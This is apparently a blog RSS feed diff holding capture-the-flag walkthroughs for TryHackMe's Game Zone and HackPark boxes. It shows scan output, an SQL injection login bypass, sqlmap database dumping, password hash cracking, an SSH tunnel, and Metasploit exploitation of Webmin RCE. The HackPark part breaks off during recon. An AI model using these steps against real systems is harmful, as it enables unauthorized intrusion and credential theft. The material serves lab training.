+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Game Zone
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=2/22%OT=22%CT=1%CU=42887%PV=Y%DS=2%DC=T%G=Y%TM=603389C
+OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=8)OPS
+OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
+OS:1NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
+OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT      ADDRESS
+1   33.34 ms 10.11.0.1
+2   33.56 ms $target_ip
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 41.63 seconds
+</code></pre></td></tr></table>
+</div>
+</div><p>Not much to see here : <code>Apache/2.4.18</code>, and <code>ssh</code>. Not much in <code>searchsploit</code> either. Let&rsquo;s directly run our usual web scanners and manually browse the website with <code>Burp</code> in the meantime.</p>
+<h3 id="web-scanning">Web scanning</h3>
+<p>First <code>nikto</code> :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">nikto -h http://$target_ip
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          $target_ip
++ Target Hostname:    $target_ip
++ Target Port:        80
++ Start Time:         2021-02-22 11:52:39 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ Cookie PHPSESSID created without the httponly flag
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ IP address found in the &#39;location&#39; header. The IP is &#34;127.0.1.1&#34;.
++ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is &#34;127.0.1.1&#34;.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-3268: /images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7863 requests: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2021-02-22 11:58:11 (GMT1) (332 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre></td></tr></table>
+</div>
+</div><p>Then <code>gobuster</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">gobuster dir -u http://$target_ip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .php
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://$target_ip
+[+] Threads:        200
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2021/02/22 11:53:03 Starting gobuster
+===============================================================
+/portal.php (Status: 302)
+/index.php (Status: 200)
+/images (Status: 301)
+===============================================================
+2021/02/22 11:53:48 Finished
+===============================================================
+</code></pre></td></tr></table>
+</div>
+</div><p>Like we could guess, there is not much information from our scanners.</p>
+<p>However, manual browsing revealed a <code>login and a search form</code>. Since we are working on <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noopener noreferrer">SQLi</a>, they are most probably vulnerable!</p>
+<p>It doesn&rsquo;t seem the search function is working (none of our request displayed in Burp show the search term), and we&rsquo;ll try to exploit the authentication box.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Let&rsquo;s just try to use <code>' or 1=1 -- </code> (there is an <a href="https://portswigger.net/web-security/sql-injection/cheat-sh" target="_blank" rel="noopener noreferrer">extra space at the end</a> as username and a blank password, and we are in!</p>
+<p></p>
+<p>We now access to another search function, which this time, seems to be working, because this time, we notice that the search term in our Burp Request :</p>
+<p></p>
+<p>We will save this request as <code>req.txt</code> for a latter use.</p>
+<p>It is now time to use our new saved request, in order to try to dump the credentials :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sqlmap -r req.txt
+</code></pre></td></tr></table>
+</div>
+</div><p>It will quickly tell us the DB appears to be <code>MySQL</code>. Cancel this scan and launch it again with the new gathered info in order to dump the DB :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sqlmap -r req.txt --dbms=mysql --dump
+</code></pre></td></tr></table>
+</div>
+</div><p></p>
+<p>We now save our hash into hash.txt, and we can use various <a href="https://md5decrypt.net/en/" target="_blank" rel="noopener noreferrer">online resources</a> to detect the hash type. OUr is <code>SHA256</code>.</p>
+<p>Then we run :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
+</code></pre></td></tr></table>
+</div>
+</div><p>And it&rsquo;ll give us the password :</p>
+<p></p>
+<h3 id="getting-initial-shell">Getting Initial Shell</h3>
+<p>We can now log in via SSH with our new-found credentials :</p>
+<p></p>
+<p>Let&rsquo;s harvest user flag :</p>
+<p></p>
+<h3 id="privesc">PrivEsc</h3>
+<p>As usual, I&rsquo;ll upload <code>lse.sh</code> on the server and run it in order to see if there is anything I could exploit to elevate my privileges. I didn&rsquo;t find anything obvious, so I&rsquo;ll now upload and run <code>linpeas.sh</code> as well!</p>
+<p>We notice that <code>webmin</code> is installed and version is <code>1.580</code>, which is vulnerable to <code>RCE</code>!</p>
+<p></p>
+<p>NB : <code>webmin</code> being a tool for system administration via a website, it might be a great place to start looking.</p>
+<p>First, we will set up an SSH tunnel in order to access <code>Webmin</code> from our attacking box :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">ssh -L 10000:127.0.0.1:10000 username@$target_ip
+</code></pre></td></tr></table>
+</div>
+</div><p>Then, we can check it worked with <code>curl -I 127.0.0.1:10000</code> which should returns a <code>200</code> status code.</p>
+<p>As far, as I&rsquo;d like to complete this without <code>MetaSploit</code>, it seems I am stuck! I found <a href="https://github.com/roughiz/Webmin-1.910-Exploit-Script" target="_blank" rel="noopener noreferrer">this repo</a>, for a manual exploitation. However, it is a Python2 script, and it seems some modules are deprecated&hellip; which might why I am not able to connect back to my listener :</p>
+<p></p>
+<p>So&hellip; We now, run <code>msfconsole</code> and use <code>unix/webapp/webmin_show_cgi_exec</code>, set the required options and run it. Boom! We have a shell :</p>
+<p></p>
+<p>And we harvest our root flag :</p>
+<p></p>
+<h2 id="outro">Outro</h2>
+<p>Another fun box, and the first to have some &ldquo;real&rdquo; web vuln! One could argue that misconfiguration is also totally a &ldquo;real&rdquo; vuln, it was refreshing to see a more generic way to break in.</p>
+]]></description></item><item><title>THM - HackPark without MetaSploit</title><link>https://www.masoopy.com/thm-hackpark-without-metasploit/</link><pubDate>Sun, 21 Feb 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/thm-hackpark-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/02/HackPark_Logo.png" referrerpolicy="no-referrer">
-            </div>Intro New box, new tools, looks like we are going to crack credentials! Let&rsquo;s do it right now.
-Target THM - HackPark
-Recon According to the preview picture of the video, we will face :
- Windows box ; Misc : Hydra, RCE, WinPEAS.  So, probably some credentials cracking with Hydra in order to get initial access, then an RCE to get limited shell, and finally WinPEAS to elevate our privileges to SYSTEM.]]></description></item><item><title>HTB - Nibbles without MetaSploit</title><link>https://www.masoopy.com/htb-nibbles-without-metasploit/</link><pubDate>Wed, 17 Feb 2021 00:00:00 +0000</pubDate><author>Author</author><guid>https://www.masoopy.com/htb-nibbles-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
+            </div><h2 id="intro">Intro</h2>
+<p>New box, new tools, looks like we are going to crack credentials! Let&rsquo;s do it right now.</p>
+<h2 id="target">Target</h2>
+<p><a href="https://tryhackme.com/room/hackpark" target="_blank" rel="noopener noreferrer">THM - HackPark</a></p>
+<h2 id="recon">Recon</h2>
+<p>According to the preview picture of the video, we will face :</p>
+<ul>
+<li>Windows box ;</li>
+<li>Misc : Hydra, RCE, WinPEAS.</li>
+</ul>
+<p>So, probably some credentials cracking with Hydra in order to get initial access, then an RCE to get limited shell, and finally <code>WinPEAS</code> to elevate our privileges to <code>SYSTEM</code>. Let&rsquo;s see!</p>
+<h2 id="enum">Enum</h2>
+<p>Let&rsquo;s run our nmap <code>scan</code>. Note that this time we had to add the <code>-Pn</code> switch :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p- -Pn -oA scan $target_ip
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-21 09:25 CET
+Nmap scan report for 10.10.144.161
+Host is up (0.033s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-methods:
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 6 disallowed entries
+| /Account/*.* /search /search.aspx /error404.aspx
+|_/archive /archive.aspx
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: hackpark | hackpark amusements
+3389/tcp open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=hackpark
+| Not valid before: 2020-10-01T21:12:23
+|_Not valid after:  2021-04-02T21:12:23
+|_ssl-date: 2021-02-21T08:27:33+00:00; +3s from scanner time.
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2012 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2012
+Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 2s
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   32.23 ms 10.11.0.1
+2   32.53 ms 10.10.144.161
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 113.95 seconds
+</code></pre></td></tr></table>
+</div>
+</div><p>We discovered only two services :</p>
+<ul>
+<li>Web server on 80/tcp : Microsoft IIS 8.5</li>
+<li>RDP.</li>
+</ul>
+<h3 id="web-scanning">Web scanning</h3>
+<p>Now, we&rsquo;ll run two longs scans, dedicated to websites. During those scans, we will manually browse to our website, with <code>Burp</code> proxy. I&rsquo;ll talk about this right below the scans output.</p>
+<p>First scan :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">nikto -h http://10.10.144.161
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.144.161
++ Target Hostname:    10.10.144.161
++ Target Port:        80
++ Start Time:         2021-02-21 09:29:23 (GMT1)
+---------------------------------------------------------------------------
++ Server: Microsoft-IIS/8.5
++ Retrieved x-powered-by header: ASP.NET
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header &#39;content-script-type&#39; found, with contents: text/javascript
++ Uncommon header &#39;content-style-type&#39; found, with contents: text/css
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Entry &#39;/search/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry &#39;/search.aspx&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry &#39;/archive/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry &#39;/archive.aspx&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ &#34;robots.txt&#34; contains 6 entries which should be manually viewed.
++ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE
++ Uncommon header &#39;x-aspnetwebpages-version&#39; found, with contents: 3.0
++ OSVDB-3092: /archive/: This might be interesting...
++ OSVDB-3092: /archives/: This might be interesting...
++ 8705 requests: 0 error(s) and 15 item(s) reported on remote host
++ End Time:           2021-02-21 09:37:29 (GMT1) (486 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre></td></tr></table>
+</div>
+</div><p>Second scan :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">gobuster dir -u http://10.10.144.161 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .asp,aspx
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span><span class="lnt">248
+</span><span class="lnt">249
+</span><span class="lnt">250
+</span><span class="lnt">251
+</span><span class="lnt">252
+</span><span class="lnt">253
+</span><span class="lnt">254
+</span><span class="lnt">255
+</span><span class="lnt">256
+</span><span class="lnt">257
+</span><span class="lnt">258
+</span><span class="lnt">259
+</span><span class="lnt">260
+</span><span class="lnt">261
+</span><span class="lnt">262
+</span><span class="lnt">263
+</span><span class="lnt">264
+</span><span class="lnt">265
+</span><span class="lnt">266
+</span><span class="lnt">267
+</span><span class="lnt">268
+</span><span class="lnt">269
+</span><span class="lnt">270
+</span><span class="lnt">271
+</span><span class="lnt">272
+</span><span class="lnt">273
+</span><span class="lnt">274
+</span><span class="lnt">275
+</span><span class="lnt">276
+</span><span class="lnt">277
+</span><span class="lnt">278
+</span><span class="lnt">279
+</span><span class="lnt">280
+</span><span class="lnt">281
+</span><span class="lnt">282
+</span><span class="lnt">283
+</span><span class="lnt">284
+</span><span class="lnt">285
+</span><span class="lnt">286
+</span><span class="lnt">287
+</span><span class="lnt">288
+</span><span class="lnt">289
+</span><span class="lnt">290
+</span><span class="lnt">291
+</span><span class="lnt">292
+</span><span class="lnt">293
+</span><span class="lnt">294
+</span><span class="lnt">295
+</span><span class="lnt">296
+</span><span class="lnt">297
+</span><span class="lnt">298
+</span><span class="lnt">299
+</span><span class="lnt">300
+</span><span class="lnt">301
+</span><span class="lnt">302
+</span><span class="lnt">303
+</span><span class="lnt">304
+</span><span class="lnt">305
+</span><span class="lnt">306
+</span><span class="lnt">307
+</span><span class="lnt">308
+</span><span class="lnt">309
+</span><span class="lnt">310
+</span><span class="lnt">311
+</span><span class="lnt">312
+</span><span class="lnt">313
+</span><span class="lnt">314
+</span><span class="lnt">315
+</span><span class="lnt">316
+</span><span class="lnt">317
+</span><span class="lnt">318
+</span><span class="lnt">319
+</span><span class="lnt">320
+</span><span class="lnt">321
+</span><span class="lnt">322
+</span><span class="lnt">323
+</span><span class="lnt">324
+</span><span class="lnt">325
+</span><span class="lnt">326
+</span><span class="lnt">327
+</span><span class="lnt">328
+</span><span class="lnt">329
+</span><span class="lnt">330
+</span><span class="lnt">331
+</span><span class="lnt">332
+</span><span class="lnt">333
+</span><span class="lnt">334
+</span><span class="lnt">335
+</span><span class="lnt">336
+</span><span class="lnt">337
+</span><span class="lnt">338
+</span><span class="lnt">339
+</span><span class="lnt">340
+</span><span class="lnt">341
+</span><span class="lnt">342
+</span><span class="lnt">343
+</span><span class="lnt">344
+</span><span class="lnt">345
+</span><span class="lnt">346
+</span><span class="lnt">347
+</span><span class="lnt">348
+</span><span class="lnt">349
+</span><span class="lnt">350
+</span><span class="lnt">351
+</span><span class="lnt">352
+</span><span class="lnt">353
+</span><span class="lnt">354
+</span><span class="lnt">355
+</span><span class="lnt">356
+</span><span class="lnt">357
+</span><span class="lnt">358
+</span><span class="lnt">359
+</span><span class="lnt">360
+</span><span class="lnt">361
+</span><span class="lnt">362
+</span><span class="lnt">363
+</span><span class="lnt">364
+</span><span class="lnt">365
+</span><span class="lnt">366
+</span><span class="lnt">367
+</span><span class="lnt">368
+</span><span class="lnt">369
+</span><span class="lnt">370
+</span><span class="lnt">371
+</span><span class="lnt">372
+</span><span class="lnt">373
+</span><span class="lnt">374
+</span><span class="lnt">375
+</span><span class="lnt">376
+</span><span class="lnt">377
+</span><span class="lnt">378
+</span><span class="lnt">379
+</span><span class="lnt">380
+</span><span class="lnt">381
+</span></code></pre></td>
+<td class="lntd">
